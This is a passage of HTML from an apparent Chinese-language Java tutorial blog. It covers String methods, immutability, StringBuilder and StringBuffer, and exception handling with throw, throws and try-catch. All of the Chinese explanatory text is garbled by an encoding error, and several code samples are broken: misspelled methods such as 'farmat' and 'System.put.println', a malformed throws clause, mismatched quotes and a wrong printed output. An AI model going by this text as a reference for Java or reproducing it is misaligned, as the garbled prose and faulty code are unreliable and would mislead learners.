class="string">&quot;HELLO&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str1.toLowerCase(str2);</span><br></pre></td></tr></table></figure><p><strong>javaä¸­Stringæ˜¯ä¸å¯å˜çš„</strong><br>åœ¨javaä¸­ hello-&gt;è½¬åŒ–ä¸æ˜¯åœ¨åŸæ¥çš„å­—ç¬¦ä¸²åŸºç¡€ä¸Šè½¬æ¢ è€Œæ˜¯äº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡ </p><h5 id="å­—ç¬¦ä¸²è½¬æ•°ç»„"><a href="#å­—ç¬¦ä¸²è½¬æ•°ç»„" class="headerlink" title="å­—ç¬¦ä¸²è½¬æ•°ç»„"></a>å­—ç¬¦ä¸²è½¬æ•°ç»„</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span>[] arry = str1.toCharArrayï¼ˆï¼‰;</span><br></pre></td></tr></table></figure><h5 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.farmat(<span class="string">&quot;%d-%d-%d&quot;</span>,<span class="number">2023</span>,<span class="number">9</span>,<span class="number">28</span>);</span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²çš„æ›¿æ¢"><a href="#å­—ç¬¦ä¸²çš„æ›¿æ¢" class="headerlink" title="å­—ç¬¦ä¸²çš„æ›¿æ¢"></a>å­—ç¬¦ä¸²çš„æ›¿æ¢</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;ababcabcdabcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str.replace(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//æŠŠæ‰€æœ‰çš„&quot;ab&quot;è¿›è¡Œæ›¿æ¢</span></span><br><span class="line"><span class="comment">//ä¸æ˜¯åœ¨åŸæ¥å­—ç¬¦ä¸²ä¸Šè¿›è¡Œæ›¿æ¢ äº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ret2</span> <span class="operator">=</span> str.replace(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret3</span> <span class="operator">=</span> str.replaceFirst(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//åªæ›¿æ¢ç¬¬ä¸€ä¸ª&quot;ab&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret4</span> <span class="operator">=</span> str.replaceAll(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//æ›¿æ¢æ‰€æœ‰çš„&quot;ab&quot;</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>replaceå’ŒreplaceALLçš„åŒºåˆ«<br>replaceALLæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼<br>replaceä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab43a2c43d&quot;</span>); </span><br><span class="line"></span><br><span class="line">System.out.println(src.replace(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;ab4f2c4fd. </span><br><span class="line">    </span><br><span class="line">System.out.println(src.replace(<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;f&#x27;</span>));</span><br><span class="line">=&gt;ab4f2c4fd. </span><br><span class="line">       System.out.println(src.replaceAll(<span class="string">&quot;\\d&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;abffafcffd. </span><br><span class="line">       System.out.println(src.replaceAll(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;fb43fc23d. </span><br><span class="line">       System.out.println(src.replaceFirst(<span class="string">&quot;\\d,&quot;</span>f<span class="string">&quot;));</span></span><br><span class="line"><span class="string">=&gt;abf32c43d     </span></span><br><span class="line"><span class="string">       System.out.println(src.replaceFirst(&quot;</span><span class="number">4</span><span class="string">&quot;,&quot;</span>h<span class="string">&quot;));</span></span><br><span class="line"><span class="string">=&gt;abh32c43d.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>â€œ\â€åœ¨javaä¸­æ˜¯ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨ä¸¤ä¸ªä»£è¡¨ä¸€ä¸ªã€‚ä¾‹å¦‚System.out.println( â€œ\â€œ ) ;åªæ‰“å°å‡ºä¸€ä¸ªâ€&quot;ã€‚ä½†æ˜¯â€œ\â€ä¹Ÿæ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„è½¬ä¹‰å­—ç¬¦ï¼Œéœ€è¦ç”¨ä¸¤ä¸ªä»£è¡¨ä¸€ä¸ªã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;<span class="subst">\\</span><span class="subst">\\</span>&quot;</span>è¢«javaè½¬æ¢æˆ<span class="string">&quot;<span class="subst">\\</span>&quot;</span>ï¼Œ<span class="string">&quot;<span class="subst">\\</span>&quot;</span>åˆè¢«æ­£åˆ™è¡¨è¾¾å¼è½¬æ¢æˆ<span class="string">&quot;<span class="subst">\&quot;</span></span></span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²æ‹†åˆ†"><a href="#å­—ç¬¦ä¸²æ‹†åˆ†" class="headerlink" title="å­—ç¬¦ä¸²æ‹†åˆ†"></a>å­—ç¬¦ä¸²æ‹†åˆ†</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;name=yub&amp;age=0.4&quot;</span>;</span><br><span class="line">String[] string = str.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line"><span class="comment">//åˆ†å‰²ä¹‹åçš„ç»“æœè¦å­˜å‚¨åœ¨æ•°ç»„ä¸­</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;yu bo love&quot;</span>;</span><br><span class="line">String[] string = str.split(<span class="string">&quot; &quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//åˆ†æˆä¸‰ç»„è¾“å‡º</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; string.length; i++)&#123;</span><br><span class="line">System.out.println(string[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><p>1.å­—ç¬¦â€|â€,â€*â€,â€+â€éƒ½å¾—åŠ ä¸Šè½¬ä¹‰å­—ç¬¦ï¼Œå‰é¢åŠ ä¸Š â€œ\&quot; .<br>2.æ˜¯ â€œ&quot; ï¼Œé‚£ä¹ˆå°±å¾—å†™æˆ â€œ\\â€œ .<br>3.å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ‰å¤šä¸ªåˆ†éš”ç¬¦ å¯ä»¥ç”¨â€|â€ä½œä¸ºè¿å­—ç¬¦</p><h4 id="å­—ç¬¦ä¸²çš„æˆªå–"><a href="#å­—ç¬¦ä¸²çš„æˆªå–" class="headerlink" title="å­—ç¬¦ä¸²çš„æˆªå–"></a>å­—ç¬¦ä¸²çš„æˆªå–</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;yublove&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> s.substring(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//è¾“å‡º&quot;ublove&quot;</span></span><br><span class="line"><span class="comment">//å¦‚æœä¸ºString ret = s.substring(0); æ¨¡ç‰¹è®©ä½ è¿”å›åŸæ¥çš„å¯¹è±¡ ä½†å¦‚æœä¼ å…¥å…¶ä»–å¯¹è±¡ åˆ™è¿”å›æ–°å¯¹è±¡</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;yublove&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> s.substring(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//javaä¸­éƒ½æ˜¯å·¦é—­å³å¼€ retå€¼ä¸ºubl</span></span><br></pre></td></tr></table></figure><h4 id="å…¶ä»–æ“ä½œæ–¹æ³•"><a href="#å…¶ä»–æ“ä½œæ–¹æ³•" class="headerlink" title="å…¶ä»–æ“ä½œæ–¹æ³•"></a>å…¶ä»–æ“ä½œæ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot; y u b love &quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> str.trim();</span><br><span class="line"><span class="comment">//ret1çš„å€¼ä¸º&quot;y u b love&quot; å»æ‰å·¦å³ç©ºæ ¼ å‰©ä½™ä¸­é—´ç©ºæ ¼</span></span><br></pre></td></tr></table></figure><hr><p><strong>å­—ç¬¦ä¸²ä¸ºä»€ä¹ˆæ˜¯ä¸å¯å˜çš„</strong>ï¼Ÿ<br>finalä¿®é¥°åŸºæœ¬æ•°æ®ç±»å‹ åŸºæœ¬æ•°æ®ç±»å‹çš„å€¼ä¸èƒ½è¢«æ”¹å˜<br>finalä¿®é¥°å¼•ç”¨ç±»å‹ å¼•ç”¨ç±»å‹çš„æŒ‡å‘ä¸å¯æ”¹å˜ ä½†å†…å®¹å¯æ”¹<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211211120608.png" alt="image-20240211211120608"></p><p>ä½†valueæŒ‡å‘çš„å†…å®¹å¯ä»¥å‘ç”Ÿæ”¹å˜</p><p>ä¸ºä»€ä¹ˆ String è¦è®¾è®¡æˆä¸å¯å˜çš„?(ä¸å¯å˜å¯¹è±¡çš„å¥½å¤„æ˜¯ä»€ä¹ˆ?) 1. æ–¹ä¾¿å®ç°å­—ç¬¦ä¸²å¯¹è±¡æ± . å¦‚æœ String å¯å˜, é‚£ä¹ˆå¯¹è±¡æ± å°±éœ€è¦è€ƒè™‘å†™æ—¶æ‹·è´çš„é—®é¢˜äº†.<br>2.ä¸å¯å˜å¯¹è±¡æ˜¯çº¿ç¨‹å®‰å…¨çš„.<br>3.ä¸å¯å˜å¯¹è±¡æ›´æ–¹ä¾¿ç¼“å­˜ hash code, ä½œä¸º key æ—¶å¯ä»¥æ›´é«˜æ•ˆçš„ä¿å­˜åˆ° HashMap ä¸­.</p><p>ä¸æ˜¯æ‰€æœ‰çš„ä¼ å¼•ç”¨ éƒ½æ˜¯æ”¹å˜åŸæ¥çš„å€¼  å…·ä½“æƒ…å†µä¾æ®ä»£ç è€Œå®š æœ‰å¯èƒ½åªæ”¹å˜äº†æŒ‡å‘</p><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><p>StringBuffuerä¸èƒ½ç›´æ¥èµ‹å€¼  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringbuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//é‡å†™tostringæ–¹æ³• è¾“å‡ºyub</span></span><br><span class="line">stringBulider.append(<span class="string">&quot;bo&quot;</span>);</span><br><span class="line">stringBulider.append(<span class="string">&quot;yu&quot;</span>).append(<span class="number">13.14</span>);</span><br><span class="line"><span class="comment">//è¿›è¡Œæ‹¼æ¥ æ•ˆç‡é«˜äº&quot;+&quot;</span></span><br></pre></td></tr></table></figure><p>StringBuilderå’ŒStingBufferæ˜¯å¯å˜çš„ æ•ˆç‡æ›´é«˜</p><p>StringBuilderä¸è€ƒè™‘å¹¶å‘<br>StringBufferé€‚ç”¨äºå¤šçº¿ç¨‹<br><strong>æ³¨æ„</strong><br>Stringå’ŒStringBuilderç±»ä¸èƒ½ç›´æ¥è½¬æ¢ã€‚<br>äº’ç›¸è½¬æ¢ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹åŸåˆ™:<br> Stringå˜ä¸ºStringBuilder: åˆ©ç”¨StringBuilderçš„æ„é€ æ–¹æ³•æˆ–append()æ–¹æ³•<br>StringBuilderå˜ä¸ºString: è°ƒç”¨toString()æ–¹æ³•</p><h5 id="Stringã€StringBufferã€StringBuilderçš„åŒºåˆ«"><a href="#Stringã€StringBufferã€StringBuilderçš„åŒºåˆ«" class="headerlink" title="Stringã€StringBufferã€StringBuilderçš„åŒºåˆ«"></a>Stringã€StringBufferã€StringBuilderçš„åŒºåˆ«</h5><p>1.Stringçš„å†…å®¹ä¸å¯ä¿®æ”¹ï¼ŒStringBufferä¸StringBuilderçš„å†…å®¹å¯ä»¥ä¿®æ”¹.<br>2.StringBufferä¸StringBuilderå¤§éƒ¨åˆ†åŠŸèƒ½æ˜¯ç›¸ä¼¼çš„ StringBufferé‡‡ç”¨åŒæ­¥å¤„ç†ï¼Œå±äºçº¿ç¨‹å®‰å…¨æ“ä½œï¼›<br>3.StringBuilderæœªé‡‡ç”¨åŒæ­¥å¤„ç†ï¼Œå±äºçº¿ç¨‹ä¸å®‰å…¨æ“</p><h4 id="å¼‚å¸¸-1"><a href="#å¼‚å¸¸-1" class="headerlink" title="å¼‚å¸¸"></a>å¼‚å¸¸</h4><h5 id="ç¼–è¯‘æ—¶å¼‚å¸¸-å—æŸ¥å¼‚å¸¸"><a href="#ç¼–è¯‘æ—¶å¼‚å¸¸-å—æŸ¥å¼‚å¸¸" class="headerlink" title="ç¼–è¯‘æ—¶å¼‚å¸¸&#x2F;å—æŸ¥å¼‚å¸¸"></a>ç¼–è¯‘æ—¶å¼‚å¸¸&#x2F;å—æŸ¥å¼‚å¸¸</h5><p>CloneNotSupported</p><h5 id="è¿è¡Œæ—¶å¼‚å¸¸-éå—æŸ¥å¼‚å¸¸"><a href="#è¿è¡Œæ—¶å¼‚å¸¸-éå—æŸ¥å¼‚å¸¸" class="headerlink" title="è¿è¡Œæ—¶å¼‚å¸¸&#x2F;éå—æŸ¥å¼‚å¸¸"></a>è¿è¡Œæ—¶å¼‚å¸¸&#x2F;éå—æŸ¥å¼‚å¸¸</h5><p>æ•°ç»„è¶Šç•Œ<br>ç©ºæŒ‡é’ˆ<br>ç®—æ•°å¼‚å¸¸</p><h5 id="å¼‚å¸¸çš„å¤„ç†"><a href="#å¼‚å¸¸çš„å¤„ç†" class="headerlink" title="å¼‚å¸¸çš„å¤„ç†"></a>å¼‚å¸¸çš„å¤„ç†</h5><p><strong>äº‹å‰é˜²å¾¡</strong><br><strong>äº‹åè®¤é”™</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">æ‰§è¡Œå¯èƒ½å‡ºç°å¼‚å¸¸çš„ä»£ç </span><br><span class="line">&#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">åŒ¹é…</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">æ‰§è¡Œèµ„æºçš„é¥¿å…³é—­</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼˜åŠ¿ï¼šæ­£å¸¸æµç¨‹å’Œé”™è¯¯æµç¨‹åˆ†å¼€å¤„ç†</p><h6 id="å¼‚å¸¸å¤„ç†çš„äº”ä¸ªå…³é”®å­—"><a href="#å¼‚å¸¸å¤„ç†çš„äº”ä¸ªå…³é”®å­—" class="headerlink" title="å¼‚å¸¸å¤„ç†çš„äº”ä¸ªå…³é”®å­—"></a>å¼‚å¸¸å¤„ç†çš„äº”ä¸ªå…³é”®å­—</h6><h6 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h6><p>æŠ›å‡ºå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//æŠ›å‡ºä¸€ä¸ªè‡ªå®šå¼‚å¸¸</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(<span class="string">&quot;a == 10&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>   1.throwå¿…é¡»å†™åœ¨æ–¹æ³•ä½“å†…éƒ¨ </p><ol start="2"><li>æŠ›å‡ºçš„å¯¹è±¡å¿…é¡»æ˜¯Exception æˆ–è€… Exception çš„å­ç±»å¯¹</li><li>å¦‚æœæŠ›å‡ºçš„æ˜¯ RunTimeException æˆ–è€…RunTimeException çš„å­ç±»ï¼Œåˆ™å¯.ä»¥ä¸ç”¨å¤„ç†ï¼Œç›´æ¥äº¤ç»™JVMæ¥å¤„ç† </li><li>å¦‚æœæŠ›å‡ºçš„æ˜¯ç¼–è¯‘æ—¶å¼‚å¸¸ï¼Œç”¨æˆ·å¿…é¡»å¤„ç†ï¼Œå¦åˆ™æ— æ³•é€šè¿‡ç¼–è¯‘ </li><li>å¼‚å¸¸ä¸€æ—¦æŠ›å‡ºï¼Œå…¶åçš„ä»£ç å°±ä¸ä¼šæ‰§</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//throws CloneNotSupportExceptionä¸€èˆ¬æ”¾åœ¨æ–¹æ³•å£°æ˜çš„åœ°æ–¹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportExceptionthrows&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//JVMè¿›è¡Œå¤„ç†</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportExceptionthrows &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//æŠ›å‡ºä¸€ä¸ªè‡ªå®šå¼‚å¸¸</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(<span class="string">&quot;a == 10&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><ol><li>throwså¿…é¡»è·Ÿåœ¨æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ä¹‹å </li><li>å£°æ˜çš„å¼‚å¸¸å¿…é¡»æ˜¯ Exception æˆ–è€… Exception çš„å­ç±» </li><li>æ–¹æ³•å†…éƒ¨å¦‚æœæŠ›å‡ºäº†å¤šä¸ªå¼‚å¸¸ï¼Œthrowsä¹‹åå¿…é¡»è·Ÿå¤šä¸ªå¼‚å¸¸ç±»å‹ï¼Œä¹‹é—´ç”¨é€—å·éš”å¼€ï¼Œå¦‚æœæŠ›å‡ºå¤šä¸ªå¼‚å¸¸ç±»å‹ å…·æœ‰çˆ¶å­å…³ç³»ï¼Œç›´æ¥å£°æ˜çˆ¶ç±»å³å¯ã€‚</li></ol><p><strong>å…³äºå¼‚å¸¸çš„å¤„ç†æ–¹å¼</strong><br>å¼‚å¸¸çš„ç§ç±»æœ‰å¾ˆå¤š, æˆ‘ä»¬è¦æ ¹æ®ä¸åŒçš„ä¸šåŠ¡åœºæ™¯æ¥å†³å®š.<br>å¯¹äºæ¯”è¾ƒä¸¥é‡çš„é—®é¢˜(ä¾‹å¦‚å’Œç®—é’±ç›¸å…³çš„åœºæ™¯), åº”è¯¥è®©ç¨‹åºç›´æ¥å´©æºƒ, é˜²æ­¢é€ æˆæ›´ä¸¥é‡çš„åæœ å¯¹äºä¸å¤ªä¸¥é‡çš„é—®é¢˜(å¤§å¤šæ•°åœºæ™¯), å¯ä»¥è®°å½•é”™è¯¯æ—¥å¿—, å¹¶é€šè¿‡ç›‘æ§æŠ¥è­¦ç¨‹åºåŠæ—¶é€šçŸ¥ç¨‹åºçŒ¿ å¯¹äºå¯èƒ½ä¼šæ¢å¤çš„é—®é¢˜(å’Œç½‘ç»œç›¸å…³çš„åœºæ™¯), å¯ä»¥å°è¯•è¿›è¡Œé‡è¯•. </p><h5 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;å…¶ä»–ä¸šåŠ¡ä»£ç &quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¼‚å¸¸æ²¡æœ‰è¢«å¤„ç† ä¼šäº¤ç»™jvmå¤„ç† ä¸€æ—¦ç”±jvmå¤„ç† ç¨‹åºå°±ç»ªå¼‚å¸¸ç»ˆæ­¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  System.out.println(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">    System.put.println(<span class="string">&quot;æ•è·åˆ°äº†ç®—æœ¯å¼‚å¸¸ï¼&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>catchä¸€å®šè¦æ•è·ä¸€ä¸ªå¯¹åº”çš„å¼‚å¸¸ å¦åˆ™æœ€åè¿˜æ˜¯äº¤ç»™jvm</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">try</span> &#123;</span><br><span class="line">  <span class="title class_">System</span>.<span class="property">out</span>.<span class="property">println</span>(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">&#125;<span class="title function_">catch</span>(<span class="params">Exception</span> <span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title class_">System</span>.<span class="property">put</span>.<span class="property">println</span>(<span class="string">&quot;æ•è·åˆ°äº†ç®—æœ¯å¼‚å¸¸ï¼&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exceptionæ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±» ä¸èƒ½åŒºåˆ†exceptionæ•æ‰çš„æ˜¯ä»€ä¹ˆå¼‚å¸¸ ä¸å»ºè®®ä½¿ç”¨exceptionè¿›è¡Œåˆ¤æ–­</p><p>å¯ä»¥é€šè¿‡â€™|â€™å¹¶å†™å¾ˆå¤šä¸ªå¼‚å¸¸æ£€æŸ¥<br>æˆ–è€…åˆ†å¼€å†™ å°†Exceptionçˆ¶ç±»å†™åˆ°æœ€å</p><p><strong>æ³¨æ„</strong><br>1.tryå—å†…æŠ›å‡ºå¼‚å¸¸ä½ç½®ä¹‹åçš„ä»£ç å°†ä¸ä¼šè¢«æ‰§è¡Œ </p><p>2.å¦‚æœæŠ›å‡ºå¼‚å¸¸ç±»å‹ä¸catchæ—¶å¼‚å¸¸ç±»å‹ä¸åŒ¹é…ï¼Œå³å¼‚å¸¸ä¸ä¼šè¢«æˆåŠŸæ•è·ï¼Œä¹Ÿå°±ä¸ä¼šè¢«å¤„ç†ï¼Œç»§ç»­å¾€å¤–æŠ›ï¼Œç›´åˆ° JVMæ”¶åˆ°åä¸­æ–­ç¨‹åºâ€”-å¼‚å¸¸æ˜¯æŒ‰ç…§ç±»å‹æ¥æ•è·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">System.out.println(array[<span class="number">3</span>]); <span class="comment">// æ­¤å¤„ä¼šæŠ›å‡ºæ•°ç»„è¶Šç•Œå¼‚å¸¸</span></span><br><span class="line">&#125;<span class="keyword">catch</span> (NullPointerException e)&#123; <span class="comment">// æ•è·æ—¶å€™æ•è·çš„æ˜¯ç©ºæŒ‡é’ˆå¼‚å¸¸--çœŸæ­£çš„å¼‚å¸¸æ— æ³•è¢«æ•è·åˆ°</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;ååºä»£ç &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArrayIndexOutOfBoundsException: 3at day20210917.ArrayOperator.main(ArrayOperator.java:<span class="number">24</span>)</span><br></pre></td></tr></table></figure><p>3.tryä¸­å¯èƒ½ä¼šæŠ›å‡ºå¤šä¸ªä¸åŒçš„å¼‚å¸¸å¯¹è±¡ï¼Œåˆ™å¿…é¡»ç”¨å¤šä¸ªcatchæ¥æ•è·â€”-å³å¤šç§å¼‚å¸¸ï¼Œå¤šæ¬¡æ•è·</p><ol 